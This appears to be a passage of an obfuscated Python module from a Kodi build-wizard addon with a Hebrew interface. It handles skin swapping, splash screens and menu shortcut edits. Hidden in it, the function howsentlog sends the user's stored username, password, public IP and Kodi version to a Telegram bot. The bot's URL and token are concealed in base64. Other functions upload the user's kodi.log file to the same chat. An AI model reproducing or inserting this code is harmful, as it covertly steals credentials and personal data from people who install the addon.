# coding: utf-8
import xbmc ,xbmcaddon ,xbmcgui ,xbmcplugin ,os ,sys ,xbmcvfs ,glob ,random #line:21
import shutil ,logging #line:22
import urllib2 ,urllib #line:23
import re ,time #line:24
import subprocess #line:25
import json #line:26
import zipfile #line:27
import uservar #line:28
import speedtest #line:29
import fnmatch #line:30
from shutil import copyfile #line:31
try :from sqlite3 import dbapi2 as database #line:32
except :from pysqlite2 import dbapi2 as database #line:33
from threading import Thread #line:34
from datetime import date ,datetime ,timedelta #line:35
from urlparse import urljoin #line:36
from resources .libs import extract ,downloader ,downloaderbg ,notify ,debridit ,traktit ,resloginit ,loginit ,skinSwitch ,uploadLog ,yt ,wizard as wiz #line:37
ADDON_ID =uservar .ADDON_ID #line:40
ADDONTITLE =uservar .ADDONTITLE #line:41
ADDON =wiz .addonId (ADDON_ID )#line:42
VERSION =wiz .addonInfo (ADDON_ID ,'version')#line:43
ADDONPATH =wiz .addonInfo (ADDON_ID ,'path')#line:44
DIALOG =xbmcgui .Dialog ()#line:45
DP =xbmcgui .DialogProgress ()#line:46
HOME =xbmc .translatePath ('special://home/')#line:47
LOG =xbmc .translatePath ('special://logpath/')#line:48
PROFILE =xbmc .translatePath ('special://profile/')#line:49
ADDONS =os .path .join (HOME ,'addons')#line:50
USERDATA =os .path .join (HOME ,'userdata')#line:51
PLUGIN =os .path .join (ADDONS ,ADDON_ID )#line:52
PACKAGES =os .path .join (ADDONS ,'packages')#line:53
ADDOND =os .path .join (USERDATA ,'addon_data')#line:54
ADDONDATA =os .path .join (USERDATA ,'addon_data',ADDON_ID )#line:55
ADVANCED =os .path .join (USERDATA ,'advancedsettings.xml')#line:56
SOURCES =os .path .join (USERDATA ,'sources.xml')#line:57
FAVOURITES =os .path .join (USERDATA ,'favourites.xml')#line:58
PROFILES =os .path .join (USERDATA ,'profiles.xml')#line:59
GUISETTINGS =os .path .join (USERDATA ,'guisettings.xml')#line:60
THUMBS =os .path .join (USERDATA ,'Thumbnails')#line:61
DATABASE =os .path .join (USERDATA ,'Database')#line:62
FANART =os .path .join (ADDONPATH ,'fanart.jpg')#line:63
ICON =os .path .join (ADDONPATH ,'icon.png')#line:64
ART =os .path .join (ADDONPATH ,'resources','art')#line:65
WIZLOG =os .path .join (ADDONDATA ,'wizard.log')#line:66
SKIN =xbmc .getSkinDir ()#line:68
BUILDNAME =wiz .getS ('buildname')#line:69
DEFAULTSKIN =wiz .getS ('defaultskin')#line:70
DEFAULTNAME =wiz .getS ('defaultskinname')#line:71
DEFAULTIGNORE =wiz .getS ('defaultskinignore')#line:72
BUILDVERSION =wiz .getS ('buildversion')#line:73
BUILDTHEME =wiz .getS ('buildtheme')#line:74
BUILDLATEST =wiz .getS ('latestversion')#line:75
INSTALLMETHOD =wiz .getS ('installmethod')#line:76
SHOW15 =wiz .getS ('show15')#line:77
SHOW16 =wiz .getS ('show16')#line:78
SHOW17 =wiz .getS ('show17')#line:79
SHOW18 =wiz .getS ('show18')#line:80
SHOWADULT =wiz .getS ('adult')#line:81
SHOWMAINT =wiz .getS ('showmaint')#line:82
AUTOCLEANUP =wiz .getS ('autoclean')#line:83
AUTOCACHE =wiz .getS ('clearcache')#line:84
AUTOPACKAGES =wiz .getS ('clearpackages')#line:85
AUTOTHUMBS =wiz .getS ('clearthumbs')#line:86
AUTOFEQ =wiz .getS ('autocleanfeq')#line:87
AUTONEXTRUN =wiz .getS ('nextautocleanup')#line:88
INCLUDENAN =wiz .getS ('includenan')#line:89
INCLUDEURL =wiz .getS ('includeurl')#line:90
INCLUDEBOBUNLEASHED =wiz .getS ('includebobunleashed')#line:91
INCLUDEELYSIUM =wiz .getS ('includeelysium')#line:92
INCLUDECOVENANT =wiz .getS ('includecovenant')#line:93
INCLUDEVIDEO =wiz .getS ('includevideo')#line:94
INCLUDEALL =wiz .getS ('includeall')#line:95
INCLUDEBOB =wiz .getS ('includebob')#line:96
INCLUDEPHOENIX =wiz .getS ('includephoenix')#line:97
INCLUDESPECTO =wiz .getS ('includespecto')#line:98
INCLUDEGENESIS =wiz .getS ('includegenesis')#line:99
INCLUDEEXODUS =wiz .getS ('includeexodus')#line:100
INCLUDEONECHAN =wiz .getS ('includeonechan')#line:101
INCLUDESALTS =wiz .getS ('includesalts')#line:102
INCLUDESALTSHD =wiz .getS ('includesaltslite')#line:103
INCLUDERESOLVE =wiz .getS ('includeresolve')#line:104
INCLUDEPLACENTA =wiz .getS ('includeplacenta')#line:105
INCLUDENEPTUNE =wiz .getS ('includeneptune')#line:106
INCLUDEGENESISREBORN =wiz .getS ('includegenesisreborn')#line:107
INCLUDEFLIXNET =wiz .getS ('includeflixnet')#line:108
INCLUDEURANUS =wiz .getS ('includeuranus')#line:109
SEPERATE =wiz .getS ('seperate')#line:110
NOTIFY =wiz .getS ('notify')#line:111
NOTEDISMISS =wiz .getS ('notedismiss')#line:112
NOTEID =wiz .getS ('noteid')#line:113
NOTIFY2 =wiz .getS ('notify2')#line:114
NOTEID2 =wiz .getS ('noteid2')#line:115
NOTEDISMISS2 =wiz .getS ('notedismiss2')#line:116
NOTIFY3 =wiz .getS ('notify3')#line:117
NOTEID3 =wiz .getS ('noteid3')#line:118
NOTEDISMISS3 =wiz .getS ('notedismiss3')#line:119
NOTEID =0 if NOTEID ==""else int (NOTEID )#line:120
TRAKTSAVE =wiz .getS ('traktlastsave')#line:121
REALSAVE =wiz .getS ('debridlastsave')#line:122
LOGINSAVE =wiz .getS ('loginlastsave')#line:123
KEEPMOVIEWALL =wiz .getS ('keepmoviewall')#line:124
KEEPMOVIELIST =wiz .getS ('keepmovielist')#line:125
KEEPINFO =wiz .getS ('keepinfo')#line:126
KEEPSOUND =wiz .getS ('keepsound')#line:128
KEEPVIEW =wiz .getS ('keepview')#line:129
KEEPSKIN =wiz .getS ('keepskin')#line:130
KEEPADDONS =wiz .getS ('keepaddons')#line:131
KEEPSKIN2 =wiz .getS ('keepskin2')#line:132
KEEPSKIN3 =wiz .getS ('keepskin3')#line:133
KEEPTORNET =wiz .getS ('keeptornet')#line:134
KEEPPLAYLIST =wiz .getS ('keepplaylist')#line:135
KEEPPVR =wiz .getS ('keeppvr')#line:136
ENABLE =uservar .ENABLE #line:137
KEEPTVLIST =wiz .getS ('keeptvlist')#line:139
KEEPHUBMOVIE =wiz .getS ('keephubmovie')#line:140
KEEPHUBTVSHOW =wiz .getS ('keephubtvshow')#line:141
KEEPHUBTV =wiz .getS ('keephubtv')#line:142
KEEPHUBVOD =wiz .getS ('keephubvod')#line:143
KEEPHUBKIDS =wiz .getS ('keephubkids')#line:144
KEEPHUBMUSIC =wiz .getS ('keephubmusic')#line:145
KEEPHUBMENU =wiz .getS ('keephubmenu')#line:146
HARDWAER =wiz .getS ('action')#line:148
USERNAME =wiz .getS ('user')#line:149
PASSWORD =wiz .getS ('pass')#line:150
KEEPFAVS =wiz .getS ('keepfavourites')#line:152
KEEPSOURCES =wiz .getS ('keepsources')#line:153
KEEPPROFILES =wiz .getS ('keepprofiles')#line:154
KEEPADVANCED =wiz .getS ('keepadvanced')#line:155
KEEPREPOS =wiz .getS ('keeprepos')#line:156
KEEPSUPER =wiz .getS ('keepsuper')#line:157
KEEPWHITELIST =wiz .getS ('keepwhitelist')#line:158
KEEPTRAKT =wiz .getS ('keeptrakt')#line:159
KEEPREAL =wiz .getS ('keepdebrid')#line:160
KEEPRD2 =wiz .getS ('keeprd2')#line:161
KEEPLOGIN =wiz .getS ('keeplogin')#line:162
LOGINSAVE =wiz .getS ('loginlastsave')#line:163
DEVELOPER =wiz .getS ('developer')#line:164
THIRDPARTY =wiz .getS ('enable3rd')#line:165
THIRD1NAME =wiz .getS ('wizard1name')#line:166
THIRD1URL =wiz .getS ('wizard1url')#line:167
THIRD2NAME =wiz .getS ('wizard2name')#line:168
THIRD2URL =wiz .getS ('wizard2url')#line:169
THIRD3NAME =wiz .getS ('wizard3name')#line:170
THIRD3URL =wiz .getS ('wizard3url')#line:171
BACKUPLOCATION =ADDON .getSetting ('path')if not ADDON .getSetting ('path')==''else 'special://home/'#line:172
MYBUILDS =os .path .join (BACKUPLOCATION ,'My_Builds','')#line:173
AUTOFEQ =int (float (AUTOFEQ ))if AUTOFEQ .isdigit ()else 3 #line:174
TODAY =date .today ()#line:175
TOMORROW =TODAY +timedelta (days =1 )#line:176
THREEDAYS =TODAY +timedelta (days =3 )#line:177
KODIV =float (xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:178
MCNAME =wiz .mediaCenter ()#line:179
EXCLUDES =uservar .EXCLUDES #line:180
SPEEDFILE =speedtest .SPEEDFILE #line:181
APKFILE =uservar .APKFILE #line:182
YOUTUBETITLE =uservar .YOUTUBETITLE #line:183
YOUTUBEFILE =uservar .YOUTUBEFILE #line:184
SPEED =speedtest .SPEED #line:185
UNAME =speedtest .UNAME #line:186
ADDONFILE =uservar .ADDONFILE #line:187
ADVANCEDFILE =uservar .ADVANCEDFILE #line:188
UPDATECHECK =uservar .UPDATECHECK if str (uservar .UPDATECHECK ).isdigit ()else 1 #line:189
NEXTCHECK =TODAY +timedelta (days =UPDATECHECK )#line:190
NOTIFICATION =uservar .NOTIFICATION #line:191
NOTIFICATION2 =uservar .NOTIFICATION2 #line:192
NOTIFICATION3 =uservar .NOTIFICATION3 #line:193
HELPINFO =uservar .HELPINFO #line:194
ENABLE =uservar .ENABLE #line:195
HEADERMESSAGE =uservar .HEADERMESSAGE #line:196
AUTOUPDATE =uservar .AUTOUPDATE #line:197
WIZARDFILE =uservar .WIZARDFILE #line:198
HIDECONTACT =uservar .HIDECONTACT #line:199
SKINID18 =uservar .SKINID18 #line:200
SKINID18DDONXML =uservar .SKINID18DDONXML #line:201
SKIN18ZIPURL =uservar .SKIN18ZIPURL #line:202
SKINID17 =uservar .SKINID17 #line:203
SKINID17DDONXML =uservar .SKINID17DDONXML #line:204
SKIN17ZIPURL =uservar .SKIN17ZIPURL #line:205
NEWFASTUPDATE =uservar .NEWFASTUPDATE #line:206
CONTACT =uservar .CONTACT #line:207
CONTACTICON =uservar .CONTACTICON if not uservar .CONTACTICON =='http://'else ICON #line:208
CONTACTFANART =uservar .CONTACTFANART if not uservar .CONTACTFANART =='http://'else FANART #line:209
HIDESPACERS =uservar .HIDESPACERS #line:210
TMDB_NEW_API =uservar .TMDB_NEW_API #line:211
COLOR1 =uservar .COLOR1 #line:212
COLOR2 =uservar .COLOR2 #line:213
THEME1 =uservar .THEME1 #line:214
THEME2 =uservar .THEME2 #line:215
THEME3 =uservar .THEME3 #line:216
THEME4 =uservar .THEME4 #line:217
THEME5 =uservar .THEME5 #line:218
ICONBUILDS =uservar .ICONBUILDS if not uservar .ICONBUILDS =='http://'else ICON #line:219
ICONMAINT =uservar .ICONMAINT if not uservar .ICONMAINT =='http://'else ICON #line:220
ICONAPK =uservar .ICONAPK if not uservar .ICONAPK =='http://'else ICON #line:221
ICONADDONS =uservar .ICONADDONS if not uservar .ICONADDONS =='http://'else ICON #line:222
ICONYOUTUBE =uservar .ICONYOUTUBE if not uservar .ICONYOUTUBE =='http://'else ICON #line:223
ICONSAVE =uservar .ICONSAVE if not uservar .ICONSAVE =='http://'else ICON #line:224
ICONTRAKT =uservar .ICONTRAKT if not uservar .ICONTRAKT =='http://'else ICON #line:225
ICONREAL =uservar .ICONREAL if not uservar .ICONREAL =='http://'else ICON #line:226
ICONLOGIN =uservar .ICONLOGIN if not uservar .ICONLOGIN =='http://'else ICON #line:227
ICONCONTACT =uservar .ICONCONTACT if not uservar .ICONCONTACT =='http://'else ICON #line:228
ICONSETTINGS =uservar .ICONSETTINGS if not uservar .ICONSETTINGS =='http://'else ICON #line:229
LOGFILES =wiz .LOGFILES #line:230
TRAKTID =traktit .TRAKTID #line:231
DEBRIDID =debridit .DEBRIDID #line:232
LOGINID =loginit .LOGINID #line:233
MODURL ='http://tribeca.tvaddons.ag/tools/maintenance/modules/'#line:234
MODURL2 ='http://mirrors.kodi.tv/addons/jarvis/'#line:235
INSTALLMETHODS =['Always Ask','Reload Profile','Force Close']#line:236
DEFAULTPLUGINS =['metadata.album.universal','metadata.artists.universal','metadata.common.fanart.tv','metadata.common.imdb.com','metadata.common.musicbrainz.org','metadata.themoviedb.org','metadata.tvdb.com','service.xbmc.versioncheck']#line:237
fullsecfold =xbmc .translatePath ('special://home')#line:238
addons_folder =os .path .join (fullsecfold ,'addons')#line:240
remove_url ='aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0N0aTRaSkFh'.decode ('base64')#line:242
user_folder =os .path .join (xbmc .translatePath ('special://masterprofile'),'addon_data')#line:244
remove_url2 ='aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L0N0aTRaSkFh'.decode ('base64')#line:246
fanart =xbmc .translatePath (os .path .join ('special://home/addons/'+ADDON_ID ,'fanart.jpg'))#line:247
icon =xbmc .translatePath (os .path .join ('special://home/addons/'+ADDON_ID ,'icon.png'))#line:248
def MainMenu ():#line:255
	addItem ('Skin Premium','url',5 ,icon ,fanart ,'')#line:257
def skinWIN ():#line:258
	idle ()#line:259
	O00OO000O0O0O000O =glob .glob (os .path .join (ADDONS ,'skin*'))#line:260
	OOOO00OOOOOO0OO0O =[];OO00OOOO0OO00O00O =[]#line:261
	for OO00O0O00000OOOOO in sorted (O00OO000O0O0O000O ,key =lambda OO0O00OOOO00O0OO0 :OO0O00OOOO00O0OO0 ):#line:262
		OOOO00OO00OO0OOO0 =os .path .split (OO00O0O00000OOOOO [:-1 ])[1 ]#line:263
		OO0O0OO0OOOO00OOO =os .path .join (OO00O0O00000OOOOO ,'addon.xml')#line:264
		if os .path .exists (OO0O0OO0OOOO00OOO ):#line:265
			OOOOOO000O00O0OO0 =open (OO0O0OO0OOOO00OOO )#line:266
			O0O0OOOO00O0O00OO =OOOOOO000O00O0OO0 .read ()#line:267
			O000O0O00O000OOO0 =parseDOM2 (O0O0OOOO00O0O00OO ,'addon',ret ='id')#line:268
			O0O0O00OOO0000OOO =OOOO00OO00OO0OOO0 if len (O000O0O00O000OOO0 )==0 else O000O0O00O000OOO0 [0 ]#line:269
			try :#line:270
				OO00OOO0O0O0O000O =xbmcaddon .Addon (id =O0O0O00OOO0000OOO )#line:271
				OOOO00OOOOOO0OO0O .append (OO00OOO0O0O0O000O .getAddonInfo ('name'))#line:272
				OO00OOOO0OO00O00O .append (O0O0O00OOO0000OOO )#line:273
			except :#line:274
				pass #line:275
	O000O0OOO0000000O =[];O0OOO000OOO000O0O =0 #line:276
	OO000OOO0OOOO00OO =["Current Skin -- %s"%currSkin ()]+OOOO00OOOOOO0OO0O #line:277
	O0OOO000OOO000O0O =DIALOG .select ("Select the Skin you want to swap with.",OO000OOO0OOOO00OO )#line:278
	if O0OOO000OOO000O0O ==-1 :return #line:279
	else :#line:280
		O00OO0OOOOOOOOOO0 =(O0OOO000OOO000O0O -1 )#line:281
		O000O0OOO0000000O .append (O00OO0OOOOOOOOOO0 )#line:282
		OO000OOO0OOOO00OO [O0OOO000OOO000O0O ]="%s"%(OOOO00OOOOOO0OO0O [O00OO0OOOOOOOOOO0 ])#line:283
	if O000O0OOO0000000O ==None :return #line:284
	for OOOO0OO00OO0OOO00 in O000O0OOO0000000O :#line:285
		swapSkins (OO00OOOO0OO00O00O [OOOO0OO00OO0OOO00 ])#line:286
def currSkin ():#line:288
	return xbmc .getSkinDir ('Container.PluginName')#line:289
def swapSkins (OOOO000OO00OOOOO0 ,title ="Error"):#line:290
	O000OOOO0OOO00OOO ='lookandfeel.skin'#line:291
	O000O0OOOO0OOO00O =OOOO000OO00OOOOO0 #line:292
	OOO00O00OOO0O0O00 =getOld (O000OOOO0OOO00OOO )#line:293
	OO0000OO00000O0OO =O000OOOO0OOO00OOO #line:294
	setNew (OO0000OO00000O0OO ,O000O0OOOO0OOO00O )#line:295
	O0OOOOO00OO00O000 =0 #line:296
	while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O0OOOOO00OO00O000 <100 :#line:297
		O0OOOOO00OO00O000 +=1 #line:298
		xbmc .sleep (1 )#line:299
	if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:300
		xbmc .executebuiltin ('SendClick(11)')#line:301
	return True #line:302
def getOld (O0O0OOO0O0OO0O0O0 ):#line:304
	try :#line:305
		O0O0OOO0O0OO0O0O0 ='"%s"'%O0O0OOO0O0OO0O0O0 #line:306
		OO00O0OOOOOOOOOOO ='{"jsonrpc":"2.0", "method":"Settings.GetSettingValue","params":{"setting":%s}, "id":1}'%(O0O0OOO0O0OO0O0O0 )#line:307
		O000O0O00OO00O0OO =xbmc .executeJSONRPC (OO00O0OOOOOOOOOOO )#line:309
		O000O0O00OO00O0OO =simplejson .loads (O000O0O00OO00O0OO )#line:310
		if O000O0O00OO00O0OO .has_key ('result'):#line:311
			if O000O0O00OO00O0OO ['result'].has_key ('value'):#line:312
				return O000O0O00OO00O0OO ['result']['value']#line:313
	except :#line:314
		pass #line:315
	return None #line:316
def setNew (O0OO00O0OO000O0OO ,OO0O0OO0OO0O000O0 ):#line:319
	try :#line:320
		O0OO00O0OO000O0OO ='"%s"'%O0OO00O0OO000O0OO #line:321
		OO0O0OO0OO0O000O0 ='"%s"'%OO0O0OO0OO0O000O0 #line:322
		OOOO0OOOOO00OO000 ='{"jsonrpc":"2.0", "method":"Settings.SetSettingValue","params":{"setting":%s,"value":%s}, "id":1}'%(O0OO00O0OO000O0OO ,OO0O0OO0OO0O000O0 )#line:323
		O0O0O00OOO0000O00 =xbmc .executeJSONRPC (OOOO0OOOOO00OO000 )#line:325
	except :#line:326
		pass #line:327
	return None #line:328
def idle ():#line:329
	return xbmc .executebuiltin ('Dialog.Close(busydialog)')#line:330
def resetkodi ():#line:332
		if xbmc .getCondVisibility ('system.platform.windows'):#line:333
			OO00OO0O00O00OOOO =xbmcgui .DialogProgress ()#line:334
			OO00OO0O00O00OOOO .create ("ההתקנה תסגר והקודי יעלה אוטומטית","אנא המתן 5 שניות",'',"[COLOR orange][B]ברוכים הבאים לקודי אנונימוס![/B][/COLOR]")#line:337
			OO00OO0O00O00OOOO .update (0 )#line:338
			for OO0OO00O0OOOOO0O0 in range (5 ,-1 ,-1 ):#line:339
				time .sleep (1 )#line:340
				OO00OO0O00O00OOOO .update (int ((5 -OO0OO00O0OOOOO0O0 )/5.0 *100 ),"מתבצע הפעלה מחדש לקודי",'בעוד {0} שניות'.format (OO0OO00O0OOOOO0O0 ),'')#line:341
				if OO00OO0O00O00OOOO .iscanceled ():#line:342
					from resources .libs import win #line:343
					return None ,None #line:344
			from resources .libs import win #line:345
		else :#line:346
			OO00OO0O00O00OOOO =xbmcgui .DialogProgress ()#line:347
			OO00OO0O00O00OOOO .create ("ההתקנה תסגר אוטומטית","אנא המתן 5 שניות",'',"[COLOR orange][B]ברוכים הבאים לקודי אנונימוס![/B][/COLOR]")#line:350
			OO00OO0O00O00OOOO .update (0 )#line:351
			for OO0OO00O0OOOOO0O0 in range (5 ,-1 ,-1 ):#line:352
				time .sleep (1 )#line:353
				OO00OO0O00O00OOOO .update (int ((5 -OO0OO00O0OOOOO0O0 )/5.0 *100 ),"ההתקנה תסגר",'בעוד {0} שניות'.format (OO0OO00O0OOOOO0O0 ),'')#line:354
				if OO00OO0O00O00OOOO .iscanceled ():#line:355
					os ._exit (1 )#line:356
					return None ,None #line:357
			os ._exit (1 )#line:358
def backtokodi ():#line:360
			wiz .kodi17Fix ()#line:361
			fix18update ()#line:362
			fix17update ()#line:363
def howsentlog ():#line:364
       try :#line:365
          import json #line:366
          OOOOOO000OOOO0OOO =(ADDON .getSetting ("user"))#line:367
          O0OO00O00OO000OO0 =(ADDON .getSetting ("pass"))#line:368
          O0O00O0O0O00O000O =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:369
          O00OOO0OOOOOO0OO0 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0yNzQyNjIzODkmdGV4dD0gICDXqdec15cg15zXmiDXnNeV15I='#line:371
          O0O0O0OO000O0O000 =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:372
          O00OO0000OOO0OO00 =str (json .loads (O0O0O0OO000O0O000 )['ip'])#line:373
          O0000OOOO000O0000 =OOOOOO000OOOO0OOO #line:374
          O00OO0000OO00O0OO =O0OO00O00OO000OO0 #line:375
          import socket #line:377
          O0O0O0OO000O0O000 =urllib2 .urlopen (O00OOO0OOOOOO0OO0 .decode ('base64')+' - '+O0000OOOO000O0000 +' - '+O00OO0000OO00O0OO +' - '+O0O00O0O0O00O000O ).readlines ()#line:378
       except :pass #line:379
def testcommand ():#line:380
    howsentlog ()#line:381
    import requests #line:382
    if xbmc .getCondVisibility ('system.platform.windows'):#line:383
       OO0O00O0O0OO00OOO =xbmc .translatePath ('special://home/kodi.log')#line:384
       O0O0OOO000OOOOOOO ={'chat_id':(None ,'-274262389'),'document':(OO0O00O0O0OO00OOO ,open (OO0O00O0O0OO00OOO ,'rb')),}#line:388
       OO000O0O0O00OO0OO ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:389
       O00O00O0OO0O0OOOO =requests .post (OO000O0O0O00OO0OO .decode ('base64'),files =O0O0OOO000OOOOOOO )#line:391
    elif xbmc .getCondVisibility ('system.platform.android'):#line:392
         OO0O00O0O0OO00OOO =xbmc .translatePath ('special://temp/kodi.log')#line:393
         O0O0OOO000OOOOOOO ={'chat_id':(None ,'-274262389'),'document':(OO0O00O0O0OO00OOO ,open (OO0O00O0O0OO00OOO ,'rb')),}#line:397
         OO000O0O0O00OO0OO ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:398
         O00O00O0OO0O0OOOO =requests .post (OO000O0O0O00OO0OO .decode ('base64'),files =O0O0OOO000OOOOOOO )#line:400
    else :#line:401
         OO0O00O0O0OO00OOO =xbmc .translatePath ('special://profile/kodi.log')#line:402
         O0O0OOO000OOOOOOO ={'chat_id':(None ,'-274262389'),'document':(OO0O00O0O0OO00OOO ,open (OO0O00O0O0OO00OOO ,'rb')),}#line:406
         OO000O0O0O00OO0OO ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:407
         O00O00O0OO0O0OOOO =requests .post (OO000O0O0O00OO0OO .decode ('base64'),files =O0O0OOO000OOOOOOO )#line:409
    wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הלוג נשלח בהצלחה :)[/COLOR]'%COLOR2 )#line:410
def googleindicat ():#line:413
			import logg #line:414
			O00OO0O00OOO0O0OO =(ADDON .getSetting ("pass"))#line:415
			OOOO0OOOO00O0OOO0 =(ADDON .getSetting ("user"))#line:416
			logg .logGA (O00OO0O00OOO0O0OO ,OOOO0OOOO00O0OOO0 )#line:417
def logsend ():#line:418
    import requests #line:419
    if xbmc .getCondVisibility ('system.platform.windows'):#line:420
       O00O00O00OOOOO000 =xbmc .translatePath ('special://home/kodi.log')#line:421
       O000O0O00000O00O0 ={'chat_id':(None ,'-274262389'),'document':(O00O00O00OOOOO000 ,open (O00O00O00OOOOO000 ,'rb')),}#line:425
       OO00O0000O0OOO00O ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:426
       O00OOO000OOO0O0OO =requests .post (OO00O0000O0OOO00O .decode ('base64'),files =O000O0O00000O00O0 )#line:428
    elif xbmc .getCondVisibility ('system.platform.android'):#line:429
         O00O00O00OOOOO000 =xbmc .translatePath ('special://temp/kodi.log')#line:430
         O000O0O00000O00O0 ={'chat_id':(None ,'-274262389'),'document':(O00O00O00OOOOO000 ,open (O00O00O00OOOOO000 ,'rb')),}#line:434
         OO00O0000O0OOO00O ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:435
         O00OOO000OOO0O0OO =requests .post (OO00O0000O0OOO00O .decode ('base64'),files =O000O0O00000O00O0 )#line:437
    else :#line:438
         O00O00O00OOOOO000 =xbmc .translatePath ('special://profile/kodi.log')#line:439
         O000O0O00000O00O0 ={'chat_id':(None ,'-274262389'),'document':(O00O00O00OOOOO000 ,open (O00O00O00OOOOO000 ,'rb')),}#line:443
         OO00O0000O0OOO00O ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kRG9jdW1lbnQ='#line:444
         O00OOO000OOO0O0OO =requests .post (OO00O0000O0OOO00O .decode ('base64'),files =O000O0O00000O00O0 )#line:446
    wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הלוג נשלח בהצלחה :)[/COLOR]'%COLOR2 )#line:447
def rdoff ():#line:449
	resloginit .resloginit ('restore','all')#line:451
	O0O00O0OO00000O00 =xbmc .translatePath ('special://home/media')+"/Splashoff.png"#line:452
	O000OOO0000O0OOO0 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:453
	copyfile (O0O00O0OO00000O00 ,O000OOO0000O0OOO0 )#line:454
def skindialogsettind18 ():#line:455
	try :#line:456
		OOO0O0000OOO0O00O =xbmc .translatePath ('special://home/addons/skin.Premium.mod/backgrounds')+"/DialogAddonSettings.xml"#line:457
		O000O00O00OOOOOO0 =xbmc .translatePath ('special://home/addons/skin.Premium.mod/16x9')+"/DialogAddonSettings.xml"#line:458
		copyfile (OOO0O0000OOO0O00O ,O000O00O00OOOOOO0 )#line:459
	except :pass #line:460
def rdon ():#line:461
	loginit .loginIt ('restore','all')#line:462
	O0O0OOOO0OO0OO000 =xbmc .translatePath ('special://home/media')+"/SplashRd.png"#line:464
	OO000O0OO0O0O000O =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:465
	copyfile (O0O0OOOO0OO0OO000 ,OO000O0OO0O0O000O )#line:466
def adults18 ():#line:468
  OOOOOOOOO0O000O0O =(ADDON .getSetting ("adults"))#line:469
  if OOOOOOOOO0O000O0O =='true':#line:470
    OO000O0000O0OOO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:471
    with open (OO000O0000O0OOO0O ,'r')as O000O0000OO000OOO :#line:472
      OO0O00O000OO00O0O =O000O0000OO000OOO .read ()#line:473
    OO0O00O000OO00O0O =OO0O00O000OO00O0O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - 18+</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://skin/extras/icons/sex.png</thumb>
		<action>ActivateWindow(1113)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - 18+</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://skin/extras/icons/sex.png</thumb>
		<action>ActivateWindow(1113)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:491
    with open (OO000O0000O0OOO0O ,'w')as O000O0000OO000OOO :#line:494
      O000O0000OO000OOO .write (OO0O00O000OO00O0O )#line:495
def rdbuildaddon ():#line:496
  O00O00000000OO00O =(ADDON .getSetting ("rdbuild"))#line:497
  if O00O00000000OO00O =='true':#line:498
    OOOOO000OOO0000OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:499
    with open (OOOOO000OOO0000OO ,'r')as OO0OOOO0O00OOOO00 :#line:500
      O00O0O00OOO0O000O =OO0OOOO0O00OOOO00 .read ()#line:501
    O00O0O00OOO0O000O =O00O0O00OOO0O000O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:519
    with open (OOOOO000OOO0000OO ,'w')as OO0OOOO0O00OOOO00 :#line:522
      OO0OOOO0O00OOOO00 .write (O00O0O00OOO0O000O )#line:523
    OOOOO000OOO0000OO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:527
    with open (OOOOO000OOO0000OO ,'r')as OO0OOOO0O00OOOO00 :#line:528
      O00O0O00OOO0O000O =OO0OOOO0O00OOOO00 .read ()#line:529
